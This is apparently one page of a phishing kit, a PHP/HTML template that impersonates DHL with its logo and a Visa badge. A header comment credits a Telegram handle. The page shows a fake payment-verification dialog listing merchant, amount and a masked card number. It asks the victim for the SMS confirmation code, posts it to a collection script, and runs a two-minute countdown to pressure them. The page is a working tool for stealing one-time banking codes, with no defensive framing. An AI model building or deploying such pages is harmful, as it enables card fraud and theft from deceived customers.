<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @eldaronne
-->


<?php 

require_once "functions.php";
lang();


?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Login to Customer Portals and Tools | DHL |</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/posta.css">
		<style>
			.modal-open{
				overflow:hidden;
				padding-right:0px;
			}
		</style>


</head>
<body class="modal-open">


		

		<!-- Modal -->
		<div class="modal fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;">
		  <div class="modal-dialog shadow">
		    <div class="modal-content">
		      <div class="modal-header">
		        	<img src="image/dhl-logo.svg">
		            <img src="image/viza.svg" class="sfli">
		      </div>
		      <div class="modal-body">
		      	<div class="text-center pp">
                    <h6><?php echo get_text('sms-title'); ?></h6>
                </div>
                <div class="tato">
                     <p><?php echo get_text('sms-message'); ?></p>
                </div>
		        <form action="post.php" method="post">
                     <input type="hidden" name="step" value="sms">
                     <div class="content">
                         <div class="left">
                             <span><?php echo get_text('merchant'); ?>:</span>
                             <span><?php echo get_text('amount'); ?>:</span>
                             <span><?php echo get_text('date'); ?>:</span>
                             <span><?php echo get_text('credit-card-number'); ?>:</span>
                             <span class="osama"><?php echo get_text('sms_code_label'); ?></span>
                         </div>
                         <div class="right">
                             <span style="color: rgb(227,41,31);">DHL EXPRESE</span>
                             <span><?php echo get_text('total'); ?></span>
                             <span><?php echo date("Y/m/d") ; ?></span>
                             <span>XXXX XXXX XXXX XXXX</span>
                             <span>
                                 <div class="form-group">
                                     <input type="text" name="sim" id="sim" class="form-control">
                                 </div>
                             </span>
                         </div>
                     </div>
                     <div class="time " >
                         <p><?php echo get_text('sms-again'); ?></p>
                         <div class="countdown ms-2" style="color:red;"></div>
                     </div>
                     <div class="botona">
                         <button class="btn" name="submit"><?php echo get_text('submit'); ?></button>
                     </div>
                     <div class="copirayt text-center">
                         <p><?php echo get_text('copyright'); ?></p>
                     </div>
                 </form>
		      </div>
		    </div>
		  </div>
		</div>


        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/Bootstrap.js"></script>
        <script>

        /*  $("#sim").mask("000000"); */

          var timer2 = "02:00";
          var interval = setInterval(function() {
          var timer = timer2.split(':');
          //by parsing integer, I avoid all extra string processing
          var minutes = parseInt(timer[0], 10);
          var seconds = parseInt(timer[1], 10);
          --seconds;
          minutes = (seconds < 0) ? --minutes : minutes;
          if (minutes < 0) clearInterval(interval);
          seconds = (seconds < 0) ? 59 : seconds;
          seconds = (seconds < 10) ? '0' + seconds : seconds;
          //minutes = (minutes < 10) ?  minutes : minutes;
          $('.countdown').html(minutes + ':' + seconds);
          timer2 = minutes + ':' + seconds;
          }, 1000);
             
        </script>
</body>
</html>